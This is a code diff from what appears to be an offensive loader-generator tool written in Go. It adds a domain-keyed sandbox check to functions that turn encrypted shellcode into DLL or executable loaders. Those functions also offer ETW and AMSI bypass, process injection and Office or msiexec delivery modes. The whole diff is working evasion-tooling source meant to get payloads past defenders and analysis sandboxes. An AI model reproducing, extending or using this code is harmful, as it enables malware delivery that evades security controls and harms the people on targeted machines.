@@ -200,7 +200,7 @@ func WriteProcessMemory_Buff(number string, b64number int) (string, string, stri
 	return buffer.String(), WriteProcessMemory.Variables["decode"], WriteProcessMemory.Variables["WriteProcessMemory"]
 }
 
-func DLLfile(b64ciphertext string, b64key string, b64iv string, mode string, refresher bool, name string, sandbox bool, ETW bool, ProcessInjection string, AMSI bool) (string, string, string) {
+func DLLfile(b64ciphertext string, b64key string, b64iv string, mode string, refresher bool, name string, sandbox bool, sandboxdomain string, ETW bool, ProcessInjection string, AMSI bool) (string, string, string) {
 	var LoaderTemplate, DLLStructTemplate string
 	DLL := &DLL{}
 	DLL.Variables = make(map[string]string)
@@ -332,7 +332,32 @@ func DLLfile(b64ciphertext string, b64key string, b64iv string, mode string, ref
 
 	DLL.Variables["MI"] = Cryptor.VarNumberLength(4, 9)
 
-	if sandbox == true {
+	if sandbox == true && sandboxdomain != "" {
+		DLL.Variables["SandboxOS"] = `"os"`
+		DLL.Variables["IsDomainJoined"] = Cryptor.VarNumberLength(10, 19)
+		DLL.Variables["domain"] = Cryptor.VarNumberLength(10, 19)
+		DLL.Variables["status"] = Cryptor.VarNumberLength(10, 19)
+		SandboxFunctionTemplate, err := template.New("Sandboxfunction").Parse(Struct.Sandbox_DomainSpecific())
+		if err != nil {
+			log.Fatal(err)
+		}
+		if err := SandboxFunctionTemplate.Execute(&buffer, DLL); err != nil {
+			log.Fatal(err)
+		}
+		DLL.Variables["Sandboxfunction"] = buffer.String()
+		DLL.Variables["sandboxdomain"] = sandboxdomain
+		DLL.Variables["domainresult"] = Cryptor.VarNumberLength(10, 19)
+		Sandbox_DomainJoinedTemplate, err := template.New("Sandbox_DomainJoined").Parse(Struct.Sandbox_DomainSpecificJoined())
+		buffer.Reset()
+		if err != nil {
+			log.Fatal(err)
+		}
+		if err := Sandbox_DomainJoinedTemplate.Execute(&buffer, DLL); err != nil {
+			log.Fatal(err)
+		}
+		DLL.Variables["Sandbox"] = buffer.String()
+		buffer.Reset()
+	} else if sandbox == true {
 		DLL.Variables["SandboxOS"] = `"os"`
 		DLL.Variables["IsDomainJoined"] = Cryptor.VarNumberLength(10, 19)
 		DLL.Variables["domain"] = Cryptor.VarNumberLength(10, 19)
@@ -1081,7 +1106,7 @@ func Macro_Buff(URL string, outFile string) {
 	fmt.Println(buffer.String())
 }
 
-func CompileFile(b64ciphertext string, b64key string, b64iv string, mode string, outFile string, refresher bool, console bool, sandbox bool, ETW bool, ProcessInjection string, sleep bool, AMSI bool) (string, string) {
+func CompileFile(b64ciphertext string, b64key string, b64iv string, mode string, outFile string, refresher bool, console bool, sandbox bool, sandboxdomain string, ETW bool, ProcessInjection string, sleep bool, AMSI bool) (string, string) {
 	var code, FuncName, NTFuncName string
 	name, filename := FileName(mode)
 	if ETW == false {
@@ -1095,7 +1120,7 @@ func CompileFile(b64ciphertext string, b64key string, b64iv string, mode string,
 		fmt.Println("[*] Created Process: " + ProcessInjection)
 	}
 	if mode == "excel" || mode == "wscript" || mode == "control" || mode == "dll" || mode == "msiexec" {
-		code, FuncName, NTFuncName = DLLfile(b64ciphertext, b64key, b64iv, mode, refresher, name, sandbox, ETW, ProcessInjection, AMSI)
+		code, FuncName, NTFuncName = DLLfile(b64ciphertext, b64key, b64iv, mode, refresher, name, sandbox, sandboxdomain, ETW, ProcessInjection, AMSI)
 	} else {
 		code, FuncName, NTFuncName = Binaryfile(b64ciphertext, b64key, b64iv, mode, console, sandbox, name, ETW, ProcessInjection, sleep, AMSI)
 	}
